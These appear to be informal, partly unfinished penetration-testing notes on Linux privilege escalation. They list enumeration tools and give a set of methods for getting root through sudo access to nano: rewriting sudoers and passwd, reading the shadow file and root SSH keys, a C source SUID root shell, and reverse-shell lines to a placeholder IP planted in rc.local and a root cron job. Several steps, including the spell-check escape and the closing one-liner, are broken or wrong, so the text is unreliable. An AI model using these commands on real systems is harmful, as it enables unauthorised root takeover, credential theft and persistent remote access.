### Privilege Escalation automated tools
   
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)  

--------------

Types :

Kernal  Exploit 

We first find the kernal version using uname -a

the find the vuln on the specific version 

then we use the 

---------------

# Using nano :


## Check Your Sudo Rights First:

```
sudo -l
```

Look for an entry like:

```
User username may run the following commands on hostname:
(root) NOPASSWD: /usr/bin/nano
```

## Method 1: Edit Sudoers File

```
bash

# Check if you have sudo rights for nano
sudo -l

# If you can run nano as root, edit sudoers
sudo nano /etc/sudoers

# Add this line to give your user root access without password:
your_username ALL=(ALL) NOPASSWD: ALL

# Save and exit, then you can run any command as root
sudo su
```

## Method 2: Edit Passwd File

```
bash

# Edit /etc/passwd to change root shell or create new root user
sudo nano /etc/passwd

# Change root's shell or create a new user with UID 0:
# Change: root:x:0:0:root:/root:/bin/bash
# Add: newroot:x:0:0:root:/root:/bin/bash

# Then switch to that user
su newroot
```

## Method 3: Read Root Files

```
bash

# Use nano to read sensitive files
sudo nano /etc/shadow
sudo nano /root/.ssh/id_rsa
sudo nano /root/.bash_history
```

## Method 4: Create SUID Shell

```
bash

# Create a C program that spawns shell
sudo nano /tmp/rootshell.c

Add this content:

c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

Then compile and set SUID:

bash

sudo nano /tmp/compile.sh
# Add: gcc /tmp/rootshell.c -o /tmp/rootshell
# Add: chmod 4755 /tmp/rootshell

sudo chmod +x /tmp/compile.sh
sudo /tmp/compile.sh
/tmp/rootshell
```

## Method 5: Through Nano's Spell Check Feature

```
bash

# Some nano versions allow command execution via spell check
sudo nano /some/file

# Press Ctrl+T for spell check, then:
# !bash
# or
# !sh
```

## Method 6: Using Nano's Backup Feature

```
bash

# Create a script that gives root shell
sudo nano /etc/rc.local

# Add this line before 'exit 0':
bash -i >& /dev/tcp/your_ip/4444 0>&1

# Or create a cron job
sudo nano /etc/cron.d/rootme

# Add: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/your_ip/4444 0>&1'
```

## Method 7: Direct Shell Escape (If Supported)

Some nano versions allow direct shell escape:

```
bash

sudo nano
# Then press: Ctrl+R → Ctrl+X
# Then type: reset; bash 1>&0 2>&0

## Most Reliable Method:

**Step-by-step approach:**

bash

# 1. Check your sudo rights
sudo -l

# 2. If nano is in the list, create a shell script
sudo nano /tmp/getroot.sh

# 3. Add these contents:
#!/bin/bash
bash -i

# 4. Make executable and run
sudo chmod +x /tmp/getroot.sh
sudo /tmp/getroot.sh
```

## Quick One-liner Method:

```
bash

# If you can run nano with sudo, use it to create a SUID binary
sudo nano /tmp/suid.c -c 'sudo bash -c "gcc -o /tmp/suid /tmp/suid.c && chmod 4755 /tmp/suid"'
```

--------------

